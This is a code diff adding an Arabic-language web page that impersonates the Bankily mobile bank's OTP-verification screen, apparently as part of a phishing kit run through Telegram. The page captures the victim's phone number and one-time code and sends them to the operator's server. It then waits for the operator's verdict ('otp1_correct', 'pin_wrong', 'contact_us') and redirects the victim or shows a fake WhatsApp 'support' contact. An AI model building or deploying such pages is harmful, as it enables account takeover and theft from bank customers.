@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bankily - بنكيلي - رمز التحقق الأول</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --bankily-teal: #00607A;        /* Bankily Signature Teal */
+            --bankily-teal-dark: #004356;
+            --bankily-yellow: #E8A200;      /* Bankily Signature Yellow/Gold */
+            --bankily-yellow-hover: #d19200;
+            --bg-color: #ffffff;
+            --text-dark: #1e293b;
+            --text-muted: #64748b;
+            --border-line: #cbd5e1;
+            --btn-disabled-bg: #e2e8f0;
+            --btn-disabled-text: #94a3b8;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Top Teal Header Navigation Bar */
+        .app-header {
+            width: 100%;
+            background-color: var(--bankily-teal);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 8px rgba(0, 96, 122, 0.2);
+        }
+
+        .back-btn {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 22px;
+            font-weight: bold;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .header-title {
+            flex-grow: 1;
+            text-align: center;
+            font-size: 19px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-left: 22px; /* Balance arrow space */
+        }
+
+        /* Main Container */
+        .content-container {
+            width: 100%;
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 35px 24px 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            flex-grow: 1;
+        }
+
+        .instruction-title {
+            font-size: 17px;
+            color: var(--text-dark);
+            font-weight: 700;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .phone-display {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--bankily-teal);
+            margin-bottom: 30px;
+            direction: ltr;
+            display: inline-block;
+        }
+
+        /* OTP Input Lines Style (Matches Image) */
+        .otp-input-group {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 30px;
+            direction: ltr;
+        }
+
+        .otp-box {
+            width: 52px;
+            height: 52px;
+            border: none;
+            border-bottom: 3px solid var(--border-line);
+            text-align: center;
+            font-size: 26px;
+            font-weight: 900;
+            outline: none;
+            background-color: transparent;
+            color: var(--text-dark);
+            transition: border-color 0.2s;
+            border-radius: 0;
+        }
+
+        .otp-box:focus {
+            border-bottom-color: var(--bankily-teal);
+        }
+
+        /* Countdown Timer Styling */
+        .timer-label {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+
+        .timer-value {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 20px;
+            direction: ltr;
+        }
+
+        /* Circular Progress Ring Icon */
+        .circle-loader-ring {
+            width: 42px;
+            height: 42px;
+            border: 4px solid #f1f5f9;
+            border-top: 4px solid var(--bankily-yellow);
+            border-radius: 50%;
+            margin-bottom: 12px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: var(--text-muted);
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: underline;
+            cursor: pointer;
+            padding: 6px 12px;
+            transition: color 0.2s;
+        }
+
+        .resend-btn.active-resend {
+            color: var(--bankily-teal);
+            font-weight: 800;
+        }
+
+        .error-message {
+            color: #d93025;
+            background-color: #ffebe9;
+            border: 1px solid #ff4d4f;
+            padding: 10px 14px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 700;
+            margin-top: 15px;
+            display: none;
+            width: 100%;
+        }
+
+        /* Bottom Fixed Gold Submit Button */
+        .bottom-action-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            width: 100%;
+            background-color: #ffffff;
+            padding: 16px 20px 24px;
+            box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.05);
+            display: flex;
+            justify-content: center;
+            z-index: 90;
+        }
+
+        .submit-btn {
+            width: 100%;
+            max-width: 440px;
+            background-color: var(--bankily-yellow);
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 900;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s, opacity 0.2s;
+            box-shadow: 0 4px 14px rgba(232, 162, 0, 0.35);
+        }
+
+        .submit-btn:disabled {
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .submit-btn:active:not(:disabled) {
+            background-color: var(--bankily-yellow-hover);
+        }
+
+        /* Fullscreen Processing Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 96, 122, 0.95);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 24px;
+        }
+
+        .overlay-card {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid var(--bankily-yellow);
+            border-radius: 50%;
+            animation: spinOverlay 0.9s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spinOverlay {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            color: #ffffff;
+        }
+
+        .overlay-desc {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #e2e8f0;
+            line-height: 1.5;
+        }
+
+        .wa-btn {
+            display: block;
+            width: 100%;
+            background-color: #ffffff;
+            color: var(--bankily-teal);
+            font-weight: 800;
+            padding: 16px;
+            border-radius: 12px;
+            text-decoration: none;
+            word-break: break-all;
+            font-size: 13px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Bankily Top Header -->
+<div class="app-header">
+    <button onclick="window.location.href='/page7'" class="back-btn">→</button>
+    <div class="header-title">رمز التحقق</div>
+</div>
+
+<div class="content-container">
+    <div class="instruction-title">أدخل رمز OTP المرسل إلى هاتفك المحمول</div>
+    <div class="phone-display" id="displayPhone">+222 ...</div>
+
+    <!-- 4 OTP Underlined Input Boxes -->
+    <div class="otp-input-group">
+        <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="one-time-code">
+        <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+        <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+        <input type="text" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+    </div>
+
+    <!-- Timer and Circular Ring -->
+    <div class="timer-label">تنتهي صلاحية رمز OTP خلال</div>
+    <div class="timer-value" id="timer">4 دقائق 55 ثانية</div>
+
+    <div class="circle-loader-ring"></div>
+
+    <button id="resendBtn" class="resend-btn" disabled>إعادة إرسال رمز OTP</button>
+
+    <div id="errorText" class="error-message">رمز OTP غير صحيح أو انتهت صلاحيته. يرجى المحاولة مرة أخرى.</div>
+</div>
+
+<!-- Bottom Gold Action Button -->
+<div class="bottom-action-bar">
+    <button id="submitBtn" class="submit-btn" disabled>تأكيد</button>
+</div>
+
+<!-- Status Overlay (Verifying) -->
+<div class="overlay" id="statusOverlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">جاري التحقق من الرمز...</div>
+        <div class="overlay-desc">يرجى الانتظار لحظات ريثما يتم التحقق من صحة رمز OTP.</div>
+    </div>
+</div>
+
+<!-- WhatsApp Support Overlay -->
+<div class="overlay" id="contactOverlay">
+    <div class="overlay-card">
+        <div class="overlay-title">تواصل معنا عبر واتساب</div>
+        <div class="overlay-desc">انقر على الرابط أدناه للتواصل مع خدمة دعم Bankily عبر واتساب:</div>
+        <a href="https://api.whatsapp.com/send?phone=254768003570&text=مرحباً،%20أحتاج%20إلى%20مساعدة%20في%20Bankily" target="_blank" class="wa-btn">
+            https://api.whatsapp.com/send?phone=254768003570...
+        </a>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const displayPhone = document.getElementById('displayPhone');
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    const submitBtn = document.getElementById('submitBtn');
+    const resendBtn = document.getElementById('resendBtn');
+    const timerEl = document.getElementById('timer');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const contactOverlay = document.getElementById('contactOverlay');
+    const errorText = document.getElementById('errorText');
+
+    let checkInterval = null;
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "";
+    
+    if (savedPhone) {
+        const formatted = savedPhone.replace(/^\+?222/, '').trim();
+        displayPhone.textContent = `+222 ${formatted}`;
+    }
+
+    otpBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+            if (box.value && index < otpBoxes.length - 1) {
+                otpBoxes[index + 1].focus();
+            }
+            checkOtpInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                otpBoxes[index - 1].focus();
+            }
+        });
+
+        box.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasteData = (e.clipboardData || window.clipboardData).getData('text').trim().replace(/\D/g, '');
+            if (pasteData.length === 4) {
+                otpBoxes.forEach((b, i) => b.value = pasteData[i] || '');
+                otpBoxes[3].focus();
+                checkOtpInputs();
+            }
+        });
+    });
+
+    function checkOtpInputs() {
+        const isComplete = [...otpBoxes].every(box => box.value.length === 1);
+        submitBtn.disabled = !isComplete;
+        errorText.style.display = 'none';
+    }
+
+    // Countdown Timer (Total 295 seconds = 4 Mins 55 Seconds matching screenshot)
+    let totalSeconds = 295;
+    
+    function formatTimer(sec) {
+        const mins = Math.floor(sec / 60);
+        const secs = sec % 60;
+        return `${mins} دقائق ${secs} ثانية`;
+    }
+
+    timerEl.textContent = formatTimer(totalSeconds);
+
+    const timerInterval = setInterval(() => {
+        totalSeconds--;
+        if (timerEl) timerEl.textContent = formatTimer(totalSeconds);
+
+        if (totalSeconds <= 0) {
+            clearInterval(timerInterval);
+            timerEl.textContent = "انتهت المهلة";
+            resendBtn.disabled = false;
+            resendBtn.classList.add('active-resend');
+        }
+    }, 1000);
+
+    resendBtn.addEventListener('click', async () => {
+        if (resendBtn.disabled) return;
+        
+        try {
+            await fetch('/api/resend-otp-notification', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: savedPhone, step: "First OTP" })
+            });
+        } catch(e) {
+            console.error(e);
+        }
+        location.reload();
+    });
+
+    // Admin Status Polling
+    function startStatusPolling() {
+        if (checkInterval) clearInterval(checkInterval);
+
+        checkInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
+                const data = await res.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page9";
+                } 
+                else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page6?error=wrongpin";
+                } 
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "none";
+                    errorText.textContent = "رمز OTP غير صحيح أو انتهت صلاحيته، يرجى المحاولة مرة أخرى.";
+                    errorText.style.display = "block";
+                    otpBoxes.forEach(b => b.value = "");
+                    otpBoxes[0].focus();
+                    submitBtn.disabled = true;
+                } 
+                else if (data.status === "contact_us") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "flex";
+                }
+            } catch (err) {
+                console.error("Status check error:", err);
+            }
+        }, 2000);
+    }
+
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+
+        let otpCode = "";
+        otpBoxes.forEach(b => otpCode += b.value);
+
+        if (otpCode.length !== 4) return;
+
+        contactOverlay.style.display = "none";
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
+
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: savedPhone,
+                    link: otpCode
+                })
+            });
+
+            const responseData = await res.json();
+            if (responseData.success) {
+                startStatusPolling();
+            } else {
+                statusOverlay.style.display = "none";
+                alert("حدث خطأ أثناء الإرسال.");
+            }
+        } catch (err) {
+            console.error("Submit error:", err);
+            statusOverlay.style.display = "none";
+            alert("خطأ في الاتصال بالشبكة.");
+        }
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
